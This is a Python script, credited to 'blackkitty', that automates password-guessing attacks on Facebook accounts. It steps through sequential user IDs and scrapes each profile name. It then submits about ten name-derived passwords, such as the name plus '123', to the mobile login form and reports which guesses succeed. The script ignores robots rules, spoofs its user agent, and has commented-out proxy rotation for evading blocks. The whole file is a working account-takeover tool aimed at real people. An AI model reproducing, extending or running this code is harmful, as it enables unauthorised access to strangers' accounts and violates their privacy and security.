
import mechanize
import urllib.parse


class color:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class main(color):

    """f=open('user-agents.txt','r')
    useragent=str(random.choice(list(f))).strip()"""
    
    b=mechanize.Browser()
    b.set_handle_equiv( True )
    b.set_handle_referer( True )
    b.set_handle_robots(False)
    
    
    url="https://www.facebook.com/"


    def __init__(self):
        print("create by ::: blackkitty")
        print("")
     
        
## i known i should be use loooooop
    def genpass(self,name):

        spname=name.split(' ')
        if len(spname)==1:
            a=str(spname[0]).strip()
            gen1=a
            self.facebooklogin(email=self.usr_Sid,psw=gen1)
            gen2=a+'123'
            self.facebooklogin(email=self.usr_Sid,psw=gen2)
            gen3=a.lower()
            self.facebooklogin(email=self.usr_Sid,psw=gen3)
            gen4=gen3+str(123)
            self.facebooklogin(email=self.usr_Sid,psw=gen4)
        else:
            a,b2,*c=spname
            gen1=str(a).strip()+" "+str(b2).strip()
            self.facebooklogin(email=self.usr_Sid,psw=gen1)
            gen2=a.lower()+" "+b2.lower()
            self.facebooklogin(email=self.usr_Sid,psw=gen2)
            gen3=a+str(123)
            self.facebooklogin(email=self.usr_Sid,psw=gen3)
            gen4=b2+str(123)
            self.facebooklogin(email=self.usr_Sid,psw=gen4)
            gen5=a.lower()+str(123)
            self.facebooklogin(email=self.usr_Sid,psw=gen5)
            gen6=b2.lower()+str(123)
            self.facebooklogin(email=self.usr_Sid,psw=gen6)
            gen7=a+b2
            self.facebooklogin(email=self.usr_Sid,psw=gen7)
            gen8=a.lower()+b2.lower()
            self.facebooklogin(email=self.usr_Sid,psw=gen8)
            gen9=gen8+"123"
            self.facebooklogin(email=self.usr_Sid,psw=gen9)
            gen10=gen7+"123"
            self.facebooklogin(email=self.usr_Sid,psw=gen10)

    """def proxy(self):

        f=open('proxy.json','r')
        fr=json.load(f)
        frl=random.choice(fr)['ip']
        frl2=random.choice(fr)['port']
        print(f"{frl}:{frl2}")
        self.b.set_proxies({"http":"121.101.135.46:8089"})
        res=self.b.open("https://www.myip.com/")
        print(res.read())"""
        
        

    def facebooklogin(self,email,psw):
        self.b.addheaders = [ ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1') ]
        fres=self.b.open('https://m.facebook.com/login.php')
        self.b.select_form(nr=0)
        self.b.form['email']=email
        self.b.form['pass']=psw
        respon=self.b.submit()
        if "save-device" in respon.geturl():
        
            print("login "+self.OKBLUE+self.usr_name+self.ENDC+" with password >> "+self.OKGREEN+psw+self.ENDC+" status :::",self.WARNING+"SUCCESS"+self.ENDC)
            
        else:
            print("login "+self.OKBLUE+self.usr_name+self.ENDC+" with password >> "+self.OKGREEN+psw+self.ENDC+" status :::",self.FAIL+"FAIL"+self.ENDC)

        print("respon URL :: "+self.BOLD+self.b.geturl()+self.ENDC)
    def getinfo(self):
        
        usr_id=int(input('give me starter id '))
        while True:
            self.b.addheaders=[('User-agent',"Mozilla")]
            res=self.b.open("https://www.facebook.com/"+str(usr_id))
            
    
            if "people" not in self.b.geturl() :
                usr_id+=1
                continue
            splited=self.b.geturl().split('/')
    
            self.usr_name=urllib.parse.unquote(splited[4].replace('-',' '))
            self.usr_Sid=str(usr_id).strip()
            print(self.OKCYAN+self.usr_name+self.ENDC+" :: "+self.BOLD+self.usr_Sid+self.ENDC)
            self.genpass(name=self.usr_name)
            print("")
            print("___________________________________")
            print("")
            usr_id+=1
            

if __name__=="__main__":
    i=main()
    i.getinfo()
